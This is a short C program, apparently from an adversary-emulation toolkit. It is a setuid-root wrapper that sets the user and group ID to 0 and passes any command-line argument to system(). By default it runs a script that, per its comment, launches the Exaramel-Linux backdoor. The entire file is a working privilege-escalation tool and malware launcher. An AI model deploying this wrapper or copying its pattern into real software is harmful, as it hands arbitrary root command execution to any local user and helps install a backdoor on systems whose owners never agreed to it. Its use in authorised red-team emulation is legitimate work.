#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>

int main(int argc, char *argv[])
{
    // set default command
    // check.sh executes Exaramel-Linux
    char *cmd = "/var/www/html/include/tools/check.sh";

    // overwrite command based on user input
    if (argc > 1)
    {
        cmd = argv[1];
    }

    // set the real, effective user ID to 0 for root
    int retVal = 1;
    retVal = setuid(0);
    if (retVal != 0)
    {
        fprintf(stderr, "[-] call to setuid failed with error code %i\n", retVal);
        fprintf(stderr, "[i] verify %s has the setuid bit set\n", argv[0]);
        return -1;
    }

    // set the group ID to root
    retVal = setgid(0);
    if (retVal != 0)
    {
        fprintf(stderr, "[-] call to setgid failed with error code %i\n", retVal);
        fprintf(stderr, "[i] verify %s has the setuid bit set\n", argv[0]);
        return -1;
    }

    // execute cmd with root permissions
    retVal = system(cmd);
    if (retVal != 0)
    {
        fprintf(stderr, "[-] call to system failed with error code %i\n", retVal);
        fprintf(stderr, "[i] Are you passing in a valid command?\n");
        return -1;
    }

    return 0;
}